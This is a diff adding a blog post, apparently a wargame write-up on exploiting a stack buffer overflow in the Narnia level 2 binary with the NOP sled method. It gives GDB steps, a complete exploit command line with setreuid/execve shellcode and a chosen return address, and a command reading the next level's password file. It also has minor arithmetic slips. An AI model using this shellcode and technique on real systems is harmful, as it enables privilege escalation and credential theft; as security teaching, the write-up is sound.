@@ -1,0 +1,106 @@
+---
+layout: post
+title: "The GNU Debugger and NOP Sled Method"
+date: 2018-06-14
+category: projects
+---
+<div class="article">
+<p>
+  Another vulnerability in programs are arrays of fixed size that take user input/ command-line input.
+  This requires understanding of the stack. Lets see a simple program below.
+
+  <pre class="prettyprint">
+    <code>
+      #include/<stdio.h/>
+      int main()
+      {
+        char b[3];
+        return 0;
+      }
+  </code>
+  </pre>
+
+  When the above program enters into execution, first program enters into main function.
+  That function has a physical address to return. That address is first stored onto the stack.
+  Upon that address, variable a is stored and upon that array b is stored.
+  Memory will be stored as -
+  <ol>
+  <li>b[2]</li>
+  <li>b[1]</li>
+  <li> b[0]</li>
+  <li> main function's return address</li>
+  </ol>
+
+So when you have a large enough buffer that accepts User input, you can load it with malicious shellcode to gain elevated privileges.
+How? By putting your shell-code in the buffer, overwriting Funcion return address with some address within buffer, and using No-operations to slide the code to your shell-code.
+So, executing the program with this data results in shellcode being executed. This method is called NOP sled method.
+
+You need to know somethings about GDB for doing all the above. GDB - GNU Debugger is a debugging tool for finding assembly code, setting breakpoints in your code, seeing your program in action.
+disas/disassemble command makes assembly code of the executible visible.
+x/nx $address lets you see n addresses previous to x address specified by $address
+
+
+Lets see this method in practice now.
+
+
+Enter narnia2 with password obtained from Level 1.(Refer <a href="https://karthik-balu.github.io/projects/2018/06/14/Cybersecurity-Narnia1"><b>here</b></a>)
+  <ul class="list-unstyled bold-head">
+    <li>Snap of /narnia/narnia2.c</li>
+    <img src="/static/images/projects/p11/i1.png" class="image-center image-bigger" />
+    <li>What is the vulnerability?</li>
+    <p>
+      String Copy of Commandline argument into Array of 128 bytes is done.
+      <pre class="prettyprint">
+        <code>
+        strcpy(buf,argv[1]);
+      </code>
+      </pre>
+      We can exploit this by overrunning the return address of stack into Buffer address and placing our shellcode into the buffer.
+    </p>
+    <li>Exploitation Steps:</li>
+    <ol>
+      <li>Find size of buffer using gdb.</li>
+      <pre class="prettyprint">
+        <code>
+        gdb /narnia/narnia2
+        (gdb)disas main
+      </code>
+      You can see the following snap:
+      <img src="/static/images/projects/p11/i2.png" class="image-center image-bigger" />
+      <li>In this line <b>"Sub $0x90,%esp"</b>, you can see 144(0x90) bytes is assigned to stack pointer(%esp)
+      Rough breakdown can be like 128 bytes for buffer, 4 bytes for return address, 4 bytes for function call, 8 bytes garbage. Check return address is AAAA with 0x41 *144 as argument
+      <pre class="prettyprint">
+        <code>
+        gdb --args /narnia/narnia2 $(python -c 'print "\x41"*144
+        (gdb) run
+      </code>
+      </pre>
+
+      We can use shell-code used in previous level <b><a href="http://shell-storm.org/shellcode/files/shellcode-399.php">here</a></b> as payload.
+      That is 34 bytes long. So, 34 byte payload,4 byte return address and remaining (144-38=106) bytes should be No-Operation byte -0x90 </li>
+      <li>Run the program in gdb with the payload and NOP and 4 bytes of 00 as return address. Once seg fault occurs, check 150 bytes from stack pointer with "x/150x $esp" </li>
+      <pre class="prettyprint">
+        <code>
+        gdb --args /narnia/narnia2 $(python -c 'print "\x90"*108+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"+"\x00\x00\x00\x00"')
+        (gdb) run
+        x/150x $esp
+      </code>
+      </pre>
+      Snap: <br>
+      <img src="/static/images/projects/p11/i3.png" class="image-center image-bigger" />
+
+      <li>Choose a return address in the middle of sea of 0x90s.An example would be 0xffffd7c0. </li>
+      <li>Execute ./narnia2 with payload and return address.</li>
+      /narnia/narnia2 $(python -c 'print "\x90"*108+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"+"\xc0\xd7\xff\xff"')
+      <li>Shell prompt will pop up on execution. Check whose privileges you have with "whoami" command. Crack the password for Narnia Level 3 with "cat /etc/narnia_pass/narnia3"</li>
+      <img src="/static/images/projects/p11/i4.png" class="image-center image-biggest" />
+    </ol>
+
+    <p>
+      <li>Behind the scenes explanation:</li>
+      You are basically seeing how stack stores data, overwriting return address to Main function from stack with an address within the program and sliding it with NOPs to your desired shell-code and executing it.
+    </p>
+
+    </ul>
+
+</div>
